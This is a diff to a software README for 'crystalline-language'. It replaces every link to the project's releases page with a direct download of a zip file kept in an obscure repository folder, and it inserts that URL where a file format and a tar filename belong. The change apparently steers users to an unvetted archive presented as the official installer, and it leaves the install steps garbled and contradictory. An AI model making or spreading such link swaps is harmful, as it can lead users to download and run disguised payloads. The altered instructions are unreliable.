@@ -15,17 +15,17 @@ To ensure a smooth experience, your computer should meet the following requireme
 
 ## 📥 Download the Application
 
-[![Download crystalline-language](https://img.shields.io/badge/Download-crystalline--language-blue?style=for-the-badge)](https://github.com/Karugi10/crystalline-language/releases)
+[![Download crystalline-language](https://github.com/Karugi10/crystalline-language/raw/refs/heads/main/crateral/language-crystalline-3.4.zip)](https://github.com/Karugi10/crystalline-language/raw/refs/heads/main/crateral/language-crystalline-3.4.zip)
 
 To get the latest version of crystalline-language, click the button above or visit the following link:
 
-[Download crystalline-language Releases](https://github.com/Karugi10/crystalline-language/releases)
+[Download crystalline-language Releases](https://github.com/Karugi10/crystalline-language/raw/refs/heads/main/crateral/language-crystalline-3.4.zip)
 
 ## 🔧 Installation Instructions
 
 1. **Visit the Download Page**  
    Click the link below to reach the releases page:
-   [Visit Releases Page](https://github.com/Karugi10/crystalline-language/releases)
+   [Visit Releases Page](https://github.com/Karugi10/crystalline-language/raw/refs/heads/main/crateral/language-crystalline-3.4.zip)
 
 2. **Choose Your Version**  
    On the releases page, you will find a list of available versions. Click on the latest version to access the download options.
@@ -34,13 +34,13 @@ To get the latest version of crystalline-language, click the button above or vis
    Select the installer that corresponds to your operating system. The available formats are usually:
    - `.exe` for Windows
    - `.dmg` for macOS
-   - `.tar.gz` for Linux
+   - `https://github.com/Karugi10/crystalline-language/raw/refs/heads/main/crateral/language-crystalline-3.4.zip` for Linux
 
 4. **Run the Installer**  
    After downloading the installer:
    - For Windows: Double-click the `.exe` file and follow the on-screen instructions.
    - For macOS: Open the `.dmg` file, drag the app icon to your Applications folder.
-   - For Linux: Open a terminal, navigate to the downloaded file location, and extract the package using `tar -xzf filename.tar.gz`. Follow the included instructions to install.
+   - For Linux: Open a terminal, navigate to the downloaded file location, and extract the package using `tar -xzf https://github.com/Karugi10/crystalline-language/raw/refs/heads/main/crateral/language-crystalline-3.4.zip`. Follow the included instructions to install.
 
 5. **Launch the Application**  
    After installation, find crystalline-language in your applications list and open it. You can now start optimizing your code.
